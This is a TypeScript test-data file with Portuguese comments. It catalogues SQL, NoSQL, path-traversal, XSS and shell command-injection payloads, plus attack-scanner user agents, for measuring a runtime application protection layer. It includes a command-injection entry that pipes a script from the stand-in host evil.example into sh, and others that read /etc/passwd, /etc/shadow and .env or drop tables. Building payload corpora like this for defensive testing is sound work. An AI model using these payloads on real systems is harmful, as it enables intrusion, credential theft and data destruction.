/**
 * Payloads de ataque por categoria, no formato em que chegam ao código da aplicação (já
 * decodificados pelo framework). Cada um indica o contexto da aplicação vulnerável em que funciona,
 * usado para medir a camada RASP no sink correspondente.
 */

export type SqlContext = 'string' | 'numeric';
export interface SqlPayload {
  value: string;
  context: SqlContext;
  dialect?: 'postgres' | 'mysql';
}

export const SQLI: SqlPayload[] = [
  // Dentro de literal: `WHERE name = '${v}'`
  { value: "' OR '1'='1", context: 'string' },
  { value: "' OR 1=1--", context: 'string' },
  { value: "' OR 1=1#", context: 'string', dialect: 'mysql' },
  { value: "admin'--", context: 'string' },
  { value: "admin' #", context: 'string', dialect: 'mysql' },
  { value: "admin'/*", context: 'string' },
  { value: "' OR 'x'='x", context: 'string' },
  { value: "') OR ('1'='1", context: 'string' },
  { value: "' or true--", context: 'string' },
  { value: "' OR ''='", context: 'string' },
  { value: "' UNION SELECT username, password FROM users--", context: 'string' },
  { value: "' UNION ALL SELECT NULL,NULL,NULL--", context: 'string' },
  { value: "'; DROP TABLE users;--", context: 'string' },
  { value: "' AND SLEEP(5)--", context: 'string', dialect: 'mysql' },
  { value: "'||pg_sleep(5)--", context: 'string' },
  { value: "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", context: 'string' },
  { value: "1' ORDER BY 3--", context: 'string' },
  { value: "x' AND email IS NULL; --", context: 'string' },
  { value: "' AND 1=CAST((SELECT version()) AS int)--", context: 'string' },
  { value: "%' AND 1=0 UNION SELECT table_name FROM information_schema.tables WHERE '%'='", context: 'string' },
  // Campo numérico: `WHERE id = ${v}`
  { value: '1 OR 1=1', context: 'numeric' },
  { value: '1 OR true', context: 'numeric' },
  { value: '-1 OR 2>1', context: 'numeric' },
  { value: '1; DROP TABLE users', context: 'numeric' },
  { value: '1 UNION SELECT password FROM users', context: 'numeric' },
  { value: '1 AND SLEEP(5)', context: 'numeric', dialect: 'mysql' },
  { value: '1 AND pg_sleep(5) IS NULL', context: 'numeric' },
  { value: '1) OR (1=1', context: 'numeric' },
  { value: '1/**/OR/**/1=1', context: 'numeric' },
  { value: '1 AND 1=(SELECT 1 FROM pg_user LIMIT 1)', context: 'numeric' },
  { value: '1--', context: 'numeric' },
  { value: '1 || 1=1', context: 'numeric' },
  { value: '0 OR id IS NOT NULL', context: 'numeric' },
];

/** Objetos de operador que o usuário consegue enviar via JSON ou query string (`user[$ne]=`). */
export const NOSQLI_OPERATORS: Array<Record<string, unknown>> = [
  { $ne: null },
  { $ne: '' },
  { $gt: '' },
  { $gte: 0 },
  { $regex: '.*' },
  { $regex: '^a', $options: 'i' },
  { $exists: true },
  { $in: ['admin', 'root'] },
  { $nin: [] },
  { $not: { $eq: 'x' } },
  { $where: 'sleep(1000)' },
  { $expr: { $eq: [1, 1] } },
];

/** Strings que quebram um `$where` montado como `this.name == '${v}'`. */
export const NOSQLI_WHERE: string[] = [
  "' || '1'=='1",
  "'; return true; var x='",
  "' || this.password.match(/.*/) || '",
  "a'; sleep(5000); var b='",
];

export type PathContext = 'join' | 'direct';
export interface PathPayload {
  value: string;
  /** `join`: `path.join(base, v)`; `direct`: `fs.readFile(v)`. */
  context: PathContext;
}

export const TRAVERSAL: PathPayload[] = [
  { value: '../../etc/passwd', context: 'join' },
  { value: '../../../../../../etc/shadow', context: 'join' },
  { value: '../config/database.yml', context: 'join' },
  { value: '../.env', context: 'join' },
  { value: '..\\..\\windows\\win.ini', context: 'join' },
  { value: 'img/../../../etc/hosts', context: 'join' },
  { value: './../../app/server.js', context: 'join' },
  { value: '../../proc/self/environ', context: 'join' },
  { value: '/etc/passwd', context: 'direct' },
  { value: '/proc/self/environ', context: 'direct' },
  { value: 'C:\\Windows\\win.ini', context: 'direct' },
];

export const XSS: string[] = [
  '<script>alert(1)</script>',
  '<ScRiPt>alert(document.cookie)</ScRiPt>',
  '"><script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<body onload=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<a href="javascript:alert(1)">x</a>',
  'javascript:alert(1)',
  '<input autofocus onfocus=alert(1)>',
  '<div style="animation-name:x" onanimationstart=alert(1)>',
  '<object data="data:text/html,<script>alert(1)</script>">',
  '<embed src=javascript:alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<video><source onerror=alert(1)>',
  "'-alert(1)-'",
];

export type ShellContext = 'bare' | 'squote' | 'dquote';
export interface ShellPayload {
  value: string;
  /** `bare`: `ping -c 1 ${v}`; `squote`: `convert '${v}' out.png`; `dquote`: `grep "${v}" app.log`. */
  context: ShellContext;
}

export const CMDI: ShellPayload[] = [
  { value: '8.8.8.8; cat /etc/passwd', context: 'bare' },
  { value: '8.8.8.8 && id', context: 'bare' },
  { value: '8.8.8.8 | whoami', context: 'bare' },
  { value: '8.8.8.8 || ls', context: 'bare' },
  { value: '`id`', context: 'bare' },
  { value: '$(whoami)', context: 'bare' },
  { value: '8.8.8.8; curl http://evil.example/x.sh | sh', context: 'bare' },
  { value: '8.8.8.8 > /tmp/pwn', context: 'bare' },
  { value: '8.8.8.8\nid', context: 'bare' },
  { value: '8.8.8.8 & sleep 5', context: 'bare' },
  { value: "a.png'; id; '", context: 'squote' },
  { value: "a.png' && curl evil.example #", context: 'squote' },
  { value: "x'$(id)'", context: 'squote' },
  { value: '$(cat /etc/passwd)', context: 'dquote' },
  { value: '`id`', context: 'dquote' },
  { value: 'x"; id; echo "', context: 'dquote' },
];

/** User agents de ferramentas de ataque (camada de assinaturas). */
export const SCANNER_AGENTS: string[] = [
  'sqlmap/1.7.2#stable (https://sqlmap.org)',
  'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)',
  'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)',
  'gobuster/3.6',
  'Fuzz Faster U Fool v2.1.0',
  'WPScan v3.8.25 (https://wpscan.com/wordpress-security-scanner)',
  'masscan/1.3 (https://github.com/robertdavidgraham/masscan)',
  'Mozilla/5.0 zgrab/0.x',
];
